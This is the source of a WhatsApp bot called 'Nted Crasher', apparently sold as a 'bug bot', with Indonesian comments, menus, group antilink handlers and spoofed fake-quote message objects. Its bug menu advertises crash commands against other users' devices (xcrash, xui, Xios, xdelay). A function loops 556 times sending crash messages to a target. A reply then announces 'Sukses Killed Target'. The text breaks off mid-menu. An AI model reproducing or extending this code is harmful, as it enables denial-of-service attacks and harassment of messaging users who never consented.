/* 
   BASE CREATE BY NTED CRASHER
  - EROR? FIX SENDIRI GAUSA BNYK TANYA
  - FREE RENAME/RECODE
  - FREE SHARE/DLL
  - JANGAN JUAL ANJG
  
  Support By : Allah Swt
               Ortu Gw
               Teddy ( Gw )
               Yuukey ( Friend )
               Faxz ( Friend )
               Rexz ( Friend )
               DaffaDev ( Sensei )
               Dapz ( Sensei )
               Ikky ( Pt Terpenting Gw )
               All Seller Gw ( Best Support )               
NOTE BREE : Kalo Eror Fix Sendiri, Katanya Mau Jadi Dev, Malu Nanya Ke Gw Tpi Sc Nya Di Jual, Mininal Tu Fixx Sendiri Baru Jual Jangan Nanya Ke Gw.

Nted Crasher Real : https://t.me/NtedCrasher
*/
const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const crypto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const archiver = require('archiver');
const yts = require('yt-search');
const FormData = require('form-data');
const { Client } = require('ssh2');
const moment = require("moment-timezone");
const speed = require('performance-now');
const JsConfuser = require('js-confuser');
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');
const sendSticker = require('./lib/sendSticker');
const { fromBuffer } = require('file-type');
const sharp = require('sharp');
const fetch = require('node-fetch');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const { Sticker } = require("wa-sticker-formatter");
const { pinterest, pinterest2, mediafire, tiktokDl } = require('./lib/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./lib/converter.js")
const { imageToWebp } = require('./lib/scraper');
const { LoadDataBase } = require('./source/message')
const { remini } = require('./lib/hd');
const DataBase = require('./source/database');
const fitur = require("./system/fitur")
const config = require("./lib/config.json")
const { ReplyNoButton, ReplyWithButton } = require('./system/ButtonReply')
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/function');

const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType,
prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = nted = async (nted, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);

// Buat Grup
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid

const senderNumber = sender.split("@")[0]; // Nomor polos
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefixMatch = body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\]/);
const prefix = prefixMatch ? prefixMatch[0] : ''; 

// database And Lain"
const botJid = await nted.decodeJid(nted.user?.id);
const botNumber = await nted.decodeJid(nted.user.id);
const botNumberJid = `${botNumber}@s.whatsapp.net`;
const isBot = botNumber.includes(senderNumber)
const newOwner = JSON.parse(fs.readFileSync("./lib/database/owner.json"));
const premium = JSON.parse(fs.readFileSync("./lib/database/premium.json"));
const murbug = JSON.parse(fs.readFileSync("./lib/database/murbug.json"));
const { toAudio, toPTT, toVideo, ffmpeg } = require("./lib/converter.js")
const quotesIslami = require('./lib/database/islam.json');
const motivasidek = require('./lib/database/motivasi.json');
const Katakatahariini = require('./lib/database/kata.json');
const antilink = JSON.parse(fs.readFileSync('./lib/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./lib/database/antilink2.json'))

const isBug = murbug.includes(m.sender) || murbug.includes(m.sender.split('@')[0]);
const isPrem = premium.includes(m.sender) || premium.includes(m.sender.split('@')[0]);
const isOwner = newOwner.includes(m.sender) || newOwner.includes(m.sender.split('@')[0]);
const command = body.slice(prefix.length).split(" ")[0].toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

//Const Group
const groupMetadata = m?.isGroup ? await nted.groupMetadata(m.chat).catch(() => ({})) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
let admin = null;
if (p.admin === 'superadmin') admin = 'superadmin';
else if (p.admin === 'admin') admin = 'admin';
return {
id: p.id || null,
jid: p.jid || null,
admin,
full: p
};
}) || []: [];
const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;
async function getLid(jid) {
return nted.getLidUser(jid)
}

// My Func
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
sleep  } = require('./lib/myfunc');

// fungsi waktu real time
const moment = require('moment-timezone')
// Ambil waktu Jakarta
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss")
const tanggal = moment.tz("Asia/Jakarta").format("DD/MM/YYYY") // format 12/08/2025
const hari = moment.tz("Asia/Jakarta").format("dddd") // format Senin, Selasa, dst.

// Ucapan berdasarkan jam
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:59") {
    ucapanWaktu = "🌃 𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄 𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
    ucapanWaktu = "🏞️ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆 𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
}

nted.autoshalat = nted.autoshalat ? nted.autoshalat : {}
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? nted.user.id : m.sender
let id = m.chat

if (id in nted.autoshalat) {
    return false
}

let jadwalSholat = {
    shubuh: '04:50',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '18:16',
    isya: '19:27',
}

const datek = new Date((new Date).toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`

for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        let caption = `Hai kak 👋${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Makassar dan sekitarnya._`

        // Kirim dengan tombol (WhatsApp terbaru)
        await nted.sendMessage(m.chat, {
            text: caption,
            footer: "Sholat Lah Sebelum Di Sholatkan",
            buttons: [
                { buttonId: "Baik", buttonText: { displayText: "✅ Oke, Terima Kasih" }, type: 1 }
            ],
            headerType: 1
        }, { quoted: m })

        // Simpan status untuk mencegah spam
        nted.autoshalat[id] = [
            setTimeout(async () => {
                delete nted.autoshalat[m.chat]
            }, 57000)
        ]
    }
}
// Cmd in Console
if (m.message) {
  console.log(chalk.red('━━━━━━━━━━━━━━━━━━━━━━━━━━'));
  console.log(chalk.green(' [ NTED CRASHER BOT ]'));
  console.log(chalk.red('━━━━━━━━━━━━━━━━━━━━━━━━━━'));

  // Baris-baris info
  console.log(
  chalk.bgHex("#00FFFF").black(
`⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`⌬ Pesan: ${m.body || m.mtype} \n` +
`⌬ Pengirim: ${pushname} \n` +
`⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#FF0000").black(
`⌬  Grup: ${groupName} \n` +
`⌬  GroupJid: ${m.chat}`
)
);
}
console.log();
}

// Mute grup
if (m.isGroup && db.groups[m.chat]?.mute && !isOwner) return;

// Antilink Kick
if (m.isGroup && db.groups[m.chat]?.antilink === true) {
    const linkRegex = /chat\.whatsapp\.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
    if (linkRegex.test(m.text) && !isOwner && !m.isAdmins && m.isBotAdmins && !m.fromMe) {
        const gcLink = `https://chat.whatsapp.com/${await nted.groupInviteCode(m.chat)}`;
        const isLinkThisGc = new RegExp(gcLink.replace(/\//g, "\\/"), "i");

        // Jika link yang dikirim adalah link grup ini, lewati
        if (isLinkThisGc.test(m.text)) return;

        const participant = m.key?.participant || m.sender;
        const messageId = m.key?.id;

        await nted.sendMessage(m.chat, {
            text: `*乂 Link Grup Terdeteksi*\n\n@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karena admin/ownerbot telah menyalakan fitur antilink grup lain!`,
            mentions: [m.sender]
        }, { quoted: m });

        // Hapus pesan
        await nted.sendMessage(m.chat, {
            delete: { remoteJid: m.chat, fromMe: false, id: messageId, participant }
        });

        await sleep(1000);
        await nted.groupParticipantsUpdate(m.chat, [m.sender], "remove");
    }
}

// Antilink Hapus Pesan
if (m.isGroup && db.groups[m.chat]?.antilink2 === true) {
    const linkRegex = /chat\.whatsapp\.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
    if (linkRegex.test(m.text) && !isOwner && !m.isAdmins && m.isBotAdmins && !m.fromMe) {
        const gcLink = `https://chat.whatsapp.com/${await nted.groupInviteCode(m.chat)}`;
        const isLinkThisGc = new RegExp(gcLink.replace(/\//g, "\\/"), "i");

        if (isLinkThisGc.test(m.text)) return;

        const participant = m.key?.participant || m.sender;
        const messageId = m.key?.id;

        await nted.sendMessage(m.chat, {
            text: `*Link Grup Terdeteksi*\n\n@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karena admin/ownerbot telah menyalakan fitur antilink grup lain!`,
            mentions: [m.sender]
        }, { quoted: m });

        // Hapus pesan saja (tanpa kick)
        await nted.sendMessage(m.chat, {
            delete: { remoteJid: m.chat, fromMe: false, id: messageId, participant }
        });
    }
}
// Pastikan setiap kali ada perintah grup, kita inisialisasi data grup
function initGroupData(chatId) {
    global.db.groups[chatId] ??= {
        welcome: false,
        antilink: false,
        antilink2: false
    };
}
//=========================================//

async function ForceCloseInfinty(target) {
    for (let i = 0; i <= 555; i++) {
    await BlackPayment(target);
    await DocuxPayx(target);
    console.log(chalk.red("Nted Crasher Mengirim Bug Type Force Close 1 Smg"))
    }
}
//=========================================//

        // Random Emoji //

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
        
function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
        const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
        
const Moji1 = '👑'
const Moji2 = '🚀'
const Moji3 = '✅'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]

        // Thumb Botz //
        
const Allo = fs.readFileSync(`./lib/Image/Ola.jpg`)
const X1 = fs.readFileSync(`./lib/Image/nted1.jpg`)
const X2 = fs.readFileSync(`./lib/Image/nted.jpg`)
const X3 = fs.readFileSync(`./lib/Image/thumb.jpg`)
const X4 = fs.readFileSync(`./lib/Image/Hello.jpg`)
const XXX = [X1, X2, X3, X4]
const randomIndex = Math.floor(Math.random() * XXX.length)
const ImageRandomX = XXX[randomIndex]		

const imageList2 = [
"https://files.catbox.moe/dbnlkt.jpg",
"https://files.catbox.moe/lcuzu0.jpg",
"https://files.catbox.moe/r9x45g.jpg",
"https://files.catbox.moe/mmmeik.jpg"

];

const RandomShort = imageList2[Math.floor(Math.random() * imageList2.length)];
const OlaNted = "https://files.catbox.moe/mmmeik.jpg"

const RandomMenu = "https://files.catbox.moe/5737ak.jpg"

const thumb = fs.readFileSync('./lib/Image/thumb.jpg');

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('NtedCaseV14.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `😘 Halo Sayangku, Apakah kakak sedang mencari ${prefix+mean}?\n▶️ Ini Nama menu nya : ${prefix+mean}`
nted.sendMessage(m.chat, { image: thumb, caption: response }, {quoted: m})
}}
async function doneress () {
if (!text) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let thumbnailUrl = "https://files.catbox.moe/i0xp9l.jpg"
let ressdone = `
╭──────────────❍
│ ─( 𝑺𝒖𝒌𝒔𝒆𝒔 𝑲𝒊𝒍𝒍𝒆𝒅 𝑻𝒂𝒓𝒈𝒆𝒕 )─
│
│⪼ 𝑇𝑦𝑝𝑒 𝐵𝑢𝑔 : *${command}*
│⪼ 𝑇𝑎𝑟𝑔𝑒𝑡 : *${pepec}*
╰──────────────❍

 𝑷𝒍𝒆𝒂𝒔𝒆 𝑷𝒂𝒖𝒔𝒆 𝟏𝟎 𝑴𝒊𝒏𝒖𝒕𝒆𝒔
` 
nted.sendMessage(m.chat, {
    video: {
        url: 'https://files.catbox.moe/dy3p7l.mp4'
    },
    caption: ressdone,
    gifPlayback: true,
    gifAttribution: 1,
    contextInfo: {
        mentionedJid: [m.sender],
        externalAdreply: {
            showAdAttribution: false,
            title: '𝑵𝒕𝒆𝒅 𝑪𝒓𝒂𝒔𝒉𝒆𝒓',
            body: '© 𝑻𝒆𝒅𝒅𝒚 𝑩𝒍𝒂𝒄𝒌𝑳𝒂𝒗𝒂',
            thumbnailUrl: RandomShort,
            sourceUrl: 'https://whatsapp.com/channel/0029VayaAvsLCoWymzQZrr1l',
            mediaType: 1,
            renderLargerThumbnail: false
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363393940866504@newsletter',
            newsletterName: '𝑻𝒆𝒅𝒅𝒚 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥',
            serverMessageId: -1
         }
         },
         headerType: 6,
         viewOnce: true
}, { quoted: lol});
    await nted.sendMessage(m.chat, { audio: fs.readFileSync('./sound/SendBug.mp3'), mimetype: 'audio/mpeg', ptt: true }, { quoted: ftoko });
   }
const sound = { 
key: {
fromMe: false, 
participant: `18002428478@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}
const ftoko = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        productMessage: {
          product: {
            title: `Nted Crasher Version Zeta`,
            description: `${pushname} order`,
            currencyCode: "IDR",
            priceAmount1000: "30000000",
            retailerId: `Nted Crasher Version Zeta`,
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
const Olla = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    documentMessage: {
      title: "Nted Crasher",
      fileName: "Nted Crasher",
      mimetype: "application/pdf",
      fileLength: "999999",
      jpegThumbnail: X1 // ✅ wajib Buffer
    }
  }
}
const hw = {
  key: {
    participant: '18002428478@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `© Nted Crasher New Version`,
      jpegThumbnail: "https://pomf2.lain.la/f/571tvrte.jpeg"
    }
  }, 
quoted: sound
}
const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: ImageRandomX,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "",
      message: `Nted Made Fake`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const ReplyGwe = (teks) => {
nted.sendMessage(from, { text: teks, contextInfo:{"externalAdreply": {"title": `𝐒𝐢𝐦𝐩𝐥𝐞 𝑺𝒄𝒓𝒊𝒑𝒕 𝑩𝒚 𝑵𝒕𝒆𝒅`,"body": `© 𝐍𝐭𝐞𝐝 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐁𝐨𝐭𝐳`, "previewType": "PHOTO","thumbnailUrl": `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=${command}`}}}, { quoted: lol })} 

const reaction = async (jidss, emoji) => {
nted.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
await nted.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

switch (command) {
case "menu": {
let menu = `
*${ucapanWaktu}*\n\n─( 👋 )안녕하세요 여러분, 저는 Nted Crasher 팀이 만든 버그봇 *NTED CRASHER* 입니다. 여러분이 어려움에 처했을 때 언제든 도와드리겠습니다. 

╭╼━━( 𝑵𝑻𝑬𝑫 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 )
┃𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : @NtedCrasher
┃𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 𝑽𝟏𝟒
┃𝚂𝚝𝚊𝚝𝚞𝚜  : ${nted.public ? "𝐏𝐮𝐛𝐥𝐢𝐜" : "𝐒𝐞𝐥𝐟"}
╰╼━━━━━━━━━━━━

╭╼━━━( 𝘜𝘚𝘌𝘙 𝘐𝘕𝘍𝘖 )
┃𝙽𝚊𝚖𝚎 : *${m.pushName}*
┃𝙾𝚠𝚗  : *${isOwner ? "𝑌𝑎" : "𝑇𝑖𝑑𝑎𝑘"}*
┃𝙿𝚛𝚎𝚖 : *${isPrem ? "𝑌𝑎" : "𝑇𝑖𝑑𝑎𝑘"}*
┃𝚃𝚢𝚙𝚎 : 𝘝𝘪𝘱 𝘉𝘶𝘺 𝘖𝘯𝘭𝘺
┃𝙲𝚛𝚎𝚍𝚒𝚝 : 𝑵𝒕𝒆𝒅𝑪𝒓𝒂𝒔𝒉𝒆𝒓
╰╼━━━━━━━━━━━━━

𝑷𝒍𝒆𝒂𝒔𝒆 𝑹𝒆𝒂𝒅 𝑩𝒓𝒐
Jika Script Ada Yang Eror, Maka Segera Lapor Kepada Nted/Atau Yang Kamu Beli Agar Cepat Di Respon, Jika Tidak Ada Tanggapan Ke Yang Kamu Beli Maka Segera Lapor Ke Nted, Dan Silakan Join Channel Nted Agar Tau Informasi Berikutnya.
`

    // Normal Button
    let buttons = [
        { buttonId: "𝑴𝒆𝒏𝒖 𝑮𝒘𝒆 𝑫𝒊𝒔𝒊𝒏𝒊", buttonText: { displayText: "𝑵𝑻𝑬𝑫 𝑪𝑹𝑨𝑺𝑯𝑬𝑹" }, type: 1 }
    ];

    // Flow Button
    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Pilih Menu' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝑺𝑬𝑳𝑬𝑪𝑻 𝑻𝑶 𝑩𝑼𝑻𝑻𝑶𝑵𝑺",
                    sections: [
                        {
                            title: "Pilih Sesuai Kebutuhan",
                            highlight_label: "Menu Favorit",
                            rows: [
                                { title: "BugMenu", description: "Command untuk bug menu", id: "bugmenu" },
                                { title: "MenuV2", description: "Command untuk semua menu", id: "allmenu" },
                                { title: "BuyScript", description: "Informasi pembelian script", id: ".chatme" }
                            ]
                        }
                    ]
                })
            }
        }
    ];

    let allButtons = [...buttons, ...flowActions];

    await nted.sendMessage(m.chat, {
        image: { url: "https://files.catbox.moe/pxlauw.jpg" },
        caption: menu,
        footer: 'Thank you for purchasing the NtedCrasher script',
        buttons: allButtons,
        headerType: 6,
        viewOnce: true,
        contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363371523588977@newsletter",
                newsletterName: `𝐶ℎ𝑎𝑛𝑛𝑒𝑙 𝑈𝑡𝑎𝑚𝑎 𝑁𝑡𝑒𝑑`
            },
            externalAdReply: {
                showAdAttribution: true,
                title: "𝑻𝒆𝒅𝒅𝒚 ⌑ 𝑵𝒕𝒆𝒅 𝑪𝒓𝒂𝒔𝒉𝒆𝒓",
                body: "Version Zeta",
                mediaType: 1,
                renderLargerThumbnail: false,
                thumbnailUrl: RandomShort,
                sourceUrl: "https://whatsapp.com/channel/0029VayaAvsLCoWymzQZrr1l"
            }
        }
    }, { quoted: lol });

    try {
        await nted.sendMessage(m.chat, { 
            audio: fs.readFileSync('./sound/nted.mp3'), 
            mimetype: 'audio/mpeg', 
            ptt: true 
        }, { quoted: Olla });
    } catch (err) {
        console.error("Gagal kirim audio:", err)
    }
}
break;
case "bugmenu": {
let menu = `
*${ucapanWaktu}*\n\n─( 👋 )안녕하세요 여러분, 저는 Nted Crasher 팀이 만든 버그봇 *NTED CRASHER* 입니다. 여러분이 어려움에 처했을 때 언제든 도와드리겠습니다. 

╭╼━━( 𝑵𝑻𝑬𝑫 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 )
┃𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : @NtedCrasher
┃𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 𝑽𝟏𝟒
┃𝚂𝚝𝚊𝚝𝚞𝚜  : ${nted.public ? "𝐏𝐮𝐛𝐥𝐢𝐜" : "𝐒𝐞𝐥𝐟"}
╰╼━━━━━━━━━━━━

╭╼━━━( 𝘜𝘚𝘌𝘙 𝘐𝘕𝘍𝘖 )
┃𝙽𝚊𝚖𝚎 : *${m.pushName}*
┃𝙾𝚠𝚗  : *${isOwner ? "𝑌𝑎" : "𝑇𝑖𝑑𝑎𝑘"}*
┃𝙿𝚛𝚎𝚖 : *${isPrem ? "𝑌𝑎" : "𝑇𝑖𝑑𝑎𝑘"}*
┃𝚃𝚢𝚙𝚎 : 𝘝𝘪𝘱 𝘉𝘶𝘺 𝘖𝘯𝘭𝘺
┃𝙲𝚛𝚎𝚍𝚒𝚝 : 𝑵𝒕𝒆𝒅𝑪𝒓𝒂𝒔𝒉𝒆𝒓
┃𝙷𝚊𝚛𝚒 : *${hari}*
╰╼━━━━━━━━━━━━━

╭╼( 𝑺𝒆𝒍𝒍𝒆𝒄𝒕 𝒀𝒐𝒖𝒓 𝑻𝒚𝒑𝒆 𝑩𝒖𝒈 )
┃xcrash - Crash Hard
┃xui - Crash Ui
┃Xios - Infity Ios
┃xdelay - Invisible 
╰╼━( 𝑵𝑻𝑬𝑫 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 )
`
nted.sendMessage(m.chat, {
    video: {
        url: 'https://files.catbox.moe/fyuz7x.mp4'
    },
    caption: menu,
    gifPlayback: true,
    gifAttribution: 1,
    contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
            showAdAttribution: false,
            title: '𝑵𝒕𝒆𝒅 𝑪𝒓𝒂𝒔𝒉𝒆𝒓',
            body: '© 𝐍𝐭𝐞𝐝 𝐁𝐞𝐬𝐭 𝐒𝐜𝐫𝐢𝐩𝐭',
            thumbnailUrl: RandomShort,
            sourceUrl: 'https://whatsapp.com/channel/0029VayaAvsLCoWymzQZrr1l',
            mediaType: 1,
            renderLargerThumbnail: false
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363393940866504@newsletter',
            newsletterName: '𝐍𝐭𝐞𝐝 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥',
            serverMessageId: -1
         }
         },
         headerType: 6,
         viewOnce: true
}, { quoted: lol });
    await nted.sendMessage(m.chat, { audio: fs.readFileSync('./sound/nted.mp3'), mimetype: 'audio/mpeg', ptt: true }, { quoted: Olla });
}
break;
case "allmenu": {
let menu = `
*${ucapanWaktu}*\n\n─( 👋 )안녕하세요 여러분, 저는 Nted Crasher 팀이 만든 버그봇 *NTED CRASHER* 입니다. 여러분이 어려움에 처했을 때 언제든 도와드리겠습니다. 

╭╼━━( 𝑵𝑻𝑬𝑫 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 )
┃𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : @NtedCrasher
┃𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 𝑽𝟏𝟒
┃𝚂𝚝𝚊𝚝𝚞𝚜  : ${nted.public ? "𝐏𝐮𝐛𝐥𝐢𝐜" : "𝐒𝐞𝐥𝐟"}
╰╼━━━━━━━━━━━━

╭╼━━━( 𝘜𝘚𝘌𝘙 𝘐𝘕𝘍𝘖 )
┃𝙽𝚊𝚖𝚎 : *${m.pushName}*
